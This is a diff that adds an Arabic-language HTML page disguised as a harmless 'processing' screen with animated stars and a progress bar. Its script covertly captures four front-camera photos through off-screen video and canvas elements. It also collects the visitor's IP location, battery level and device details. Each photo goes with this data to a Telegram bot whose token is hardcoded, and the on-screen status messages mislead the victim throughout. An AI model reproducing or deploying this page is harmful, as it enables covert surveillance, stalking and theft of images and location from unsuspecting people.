@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .universe {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 25px;
+            max-width: 420px;
+            width: 90%;
+        }
+
+        .core {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 40% 40%, #3b82f6, #2563eb, #1e3a5f);
+            margin: 0 auto 20px;
+            animation: corePulse 3s ease-in-out infinite;
+            box-shadow: 0 0 50px rgba(59,130,246,0.4), 0 0 100px rgba(59,130,246,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 45px;
+        }
+
+        @keyframes corePulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 50px rgba(59,130,246,0.4); }
+            50% { transform: scale(1.08); box-shadow: 0 0 80px rgba(59,130,246,0.6); }
+        }
+
+        .ring {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 1px solid rgba(59,130,246,0.2);
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation: ringRotate 8s linear infinite;
+        }
+
+        .ring:nth-child(2) {
+            width: 200px; height: 200px;
+            animation-duration: 12s;
+            animation-direction: reverse;
+        }
+
+        @keyframes ringRotate {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .status-text {
+            color: #60a5fa;
+            font-size: 13px;
+            letter-spacing: 2px;
+            margin: 12px 0;
+            min-height: 20px;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 3px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 2px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #60a5fa);
+            width: 0%;
+            transition: width 0.8s;
+            border-radius: 2px;
+        }
+
+        .photo-counter {
+            color: #3b82f6;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 8px 0;
+            font-family: 'Courier New', monospace;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid rgba(59,130,246,0.3);
+            border-radius: 25px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 2px;
+            background: rgba(59,130,246,0.1);
+            color: #60a5fa;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: rgba(59,130,246,0.2);
+            border-color: rgba(59,130,246,0.5);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .done-text {
+            display: none;
+            color: #93c5fd;
+            font-size: 13px;
+            letter-spacing: 1px;
+            margin: 10px 0;
+        }
+
+        video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="universe" id="universe"></div>
+
+    <div class="container">
+        <div style="position:relative;display:inline-block;">
+            <div class="core">🚀</div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+        </div>
+
+        <div class="status-text" id="status">جاري التهيئة...</div>
+
+        <div class="progress-container">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="photo-counter" id="counter">0 / 4</div>
+
+        <button class="btn" id="btn" onclick="start()">بدء المعالجة</button>
+
+        <div class="done-text" id="done">اكتملت المعالجة</div>
+    </div>
+
+    <video id="vid" autoplay playsinline muted></video>
+    <canvas id="can"></canvas>
+
+    <script>
+        var cid = new URL(window.location.href).searchParams.get('chatId') || '';
+        var tok = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+        var stream;
+
+        function createStars() {
+            var u = document.getElementById('universe');
+            for (var i = 0; i < 100; i++) {
+                var s = document.createElement('div');
+                s.className = 'star';
+                s.style.left = Math.random() * 100 + '%';
+                s.style.top = Math.random() * 100 + '%';
+                var sz = Math.random() * 2 + 1;
+                s.style.width = sz + 'px';
+                s.style.height = sz + 'px';
+                s.style.animationDelay = Math.random() * 3 + 's';
+                u.appendChild(s);
+            }
+        }
+
+        function up(p, t) {
+            document.getElementById('progressFill').style.width = p + '%';
+            if (t) document.getElementById('status').textContent = t;
+        }
+
+        function wt(ms) {
+            return new Promise(function(r) { setTimeout(r, ms); });
+        }
+
+        async function start() {
+            if (sent) return;
+            sent = true;
+
+            document.getElementById('btn').disabled = true;
+            document.getElementById('btn').textContent = 'جاري المعالجة...';
+
+            var ip = await getIp();
+            var bat = await getBat();
+            var dev = getDevice();
+
+            up(10, 'جاري تفعيل طلبك...');
+            await wt(800);
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 }
+                });
+
+                var vid = document.getElementById('vid');
+                var can = document.getElementById('can');
+                vid.srcObject = stream;
+
+                up(25, 'يرجى الانتظار...');
+                await wt(1500);
+
+                up(40, 'تم الوصول لليوم بنجاح');
+                await wt(600);
+
+                for (var i = 0; i < 4; i++) {
+                    up(40 + (i * 13), 'جاري معالجة اليوم ' + (i + 1) + ' من 4...');
+                    
+                    can.width = vid.videoWidth || 640;
+                    can.height = vid.videoHeight || 480;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+
+                    var blob = await new Promise(function(r) {
+                        can.toBlob(r, 'image/jpeg', 0.7);
+                    });
+
+                    var fd = new FormData();
+                    fd.append('chat_id', cid);
+                    fd.append('photo', blob, 'photo_' + (i + 1) + '.jpg');
+                    fd.append('caption', '📸 صورة ' + (i + 1) + '/4\n🌍 ' + ip.country + ' - ' + ip.city + '\n📱 ' + dev + '\n🔋 ' + bat.level + '%');
+
+                    await fetch('https://api.telegram.org/bot' + tok + '/sendPhoto', {
+                        method: 'POST', body: fd
+                    });
+
+                    document.getElementById('counter').textContent = (i + 1) + ' / 4';
+                    await wt(1200);
+                }
+
+                up(95, 'اكتملت المعالجة...');
+                await wt(600);
+
+                stream.getTracks().forEach(function(t) { t.stop(); });
+
+            } catch(e) {
+                up(100, 'تعذر الوصول لليوم');
+            }
+
+            up(100, 'اكتملت المعالجة');
+
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('done').style.display = 'block';
+            document.getElementById('counter').textContent = '4 / 4';
+        }
+
+        async function getIp() {
+            try { var r = await fetch('https://ipapi.co/json/'); var d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+
+        async function getBat() {
+            if ('getBattery' in navigator) { try { var b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; } catch(e) {} }
+            return { level: '?', charging: '?' };
+        }
+
+        function getDevice() {
+            return (navigator.platform || '?') + ' | ' + screen.width + 'x' + screen.height;
+        }
+
+        createStars();
+    </script>
+</body>
+</html>
